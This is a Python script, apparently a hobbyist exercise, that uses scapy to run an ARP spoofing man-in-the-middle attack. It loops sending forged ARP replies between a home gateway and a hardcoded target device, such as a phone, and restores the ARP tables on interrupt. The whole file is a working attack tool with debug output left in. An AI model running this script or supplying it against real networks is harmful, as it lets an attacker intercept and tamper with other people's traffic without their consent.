#!/usr/bin/env python3
import sys
import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    print(f"trying to get mac address for ip: {ip}")
    answered_list, unanswered = scapy.srp(arp_request_broadcast, timeout=10, verbose=True, iface="wlan0")
    # print(unanswered)
    # print(answered_list)
    
    # answered_list = answered_list[0]

    for ans in answered_list:
        print(ans[0][scapy.ARP].hwsrc)
        print(ans[0][scapy.ARP].op)
        # print(ans[1].show())
        print(ans[1][scapy.ARP].hwsrc)
        print(ans[1][scapy.ARP].op)
        # print(ans)
    # exit(1)

    #     print("--------")
    # print("###############################################")
    # print("###############################################")
    answered_list = [answer for answer in answered_list if answer[1].op == 2]
    print(f"lenght of answered_list: {answered_list}")
    if len(answered_list) == 0:
        return None
    answer = answered_list[0][1]

    # print(answer[0].show())
    # print(answer)
    # print(ans.show())
    return answer[1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"\tcant resolve mac for {target_ip}")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac, iface="wlan0")
    scapy.send(packet, count=4, verbose=False)




# target_ip = "192.168.178.25" # TV
# target_ip = "192.168.178.32" BlueRayPlayer? 
# target_ip = "192.168.178.33" Kalie

target_ip = "192.168.178.35" # Nexus 5 # fe80::bef5::acff:fef6::4f3b
# target_ip = "192.168.178.27" # MacBook-Pro
target_ip = "192.168.178.23" # OnePlus 3T
gateway_ip = "192.168.178.1"


gateway_mac=get_mac(gateway_ip)
if not gateway_mac:
    print(f"cant resolve gateway for {gateway_ip}")
else:
    print(f"found gateway mac for {gateway_ip}: {gateway_mac}")

try:
    packets_sent_count = 0
    while True:
        spoof(gateway_ip, target_ip)
        spoof(target_ip, gateway_ip)
        packets_sent_count = packets_sent_count + 2
        print("\r[+] Sent " + str(packets_sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables..... please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
